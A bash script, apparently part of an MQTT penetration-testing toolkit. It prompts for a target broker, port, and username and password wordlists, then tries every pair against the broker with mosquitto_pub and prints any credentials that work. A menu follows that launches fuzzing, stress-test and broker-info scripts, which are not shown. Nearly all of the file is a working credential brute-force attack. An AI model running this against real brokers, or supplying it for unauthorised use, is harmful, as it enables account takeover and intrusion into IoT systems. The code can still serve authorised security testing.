#!/bin/bash


casec()
{
echo -e "\n===============================================================";
echo -e "\nFeatures:"
echo -e "1. Brute force credentials \n2. Auto fuzzing \n3. Manual fuzzing \n4. Stress test \n5. Broker info"

echo -e "\n-----------------"
echo  -e "\e[1;34mEnter option:\e[0m"
echo "-----------------"
read option

case $option in

  1)
        ./mqttcredentialbruteforce.sh
    ;;

  2)
        ./autofuzz.sh
    ;;
  3)
        ./manualfuzz.sh
    ;;
  4)
        ./thread.sh
    ;;
 5)
        ./info.sh
    ;;

  *)
    echo -n "Please enter correct option"
    ;;
esac

}

echo ""
echo "+------------------------------------------+"
echo "| MQTT credential bruteforce               |"
printf "| %-40s |\n" "`date`"
echo "+------------------------------------------+"
echo ""
echo -e "\e[1;32mTARGET HOST ?\e[0m"
read host
echo -e "\e[1;32mPORT ? \e[0m"
read port
echo -e "\e[1;32mEnter file name or path of username list \e[0m"
read username
echo -e "\e[1;32mEnter file name or path of Password list \e[0m"
read password
echo -e "\e[1;32mThrottle time ? (0 to n seconds) \e[0m"
read speed


echo ""
echo "---------------------------------------------------------------"
echo -e "\e[1;37mSTRATING BRUTEFORCE...... \e[0m"
echo "---------------------------------------------------------------"
for un in $(cat $username)
        do
        for pd in $(cat $password)
                        do
				sleep $speed
				printf "\r\e[1;32mUSERNAME: $un PASSWORD: $pd\e[0m"

				if mosquitto_pub -h $host -p $port -t "$SYS/broker/version" -m "1.1" -u $un -P $pd &> /dev/null; then

				  	echo "";
					echo -e "\e[1;37m=============================================================== \e[0m";
					echo "";
					echo -e "\e[1;31m Credentials found username:$un password:$pd \e[0m";
					echo "";
					echo -e "\e[1;37m=============================================================== \e[0m";
					echo -n "Want to enumerate more credentials (y/n)? "

					read answer

						if [ "$answer" != "${answer#[Nn]}" ]; then 
						casec
						else
							echo "OK!"
							echo "---------------------------------------------------------------"

						fi
				fi
                        done;


done;

casec



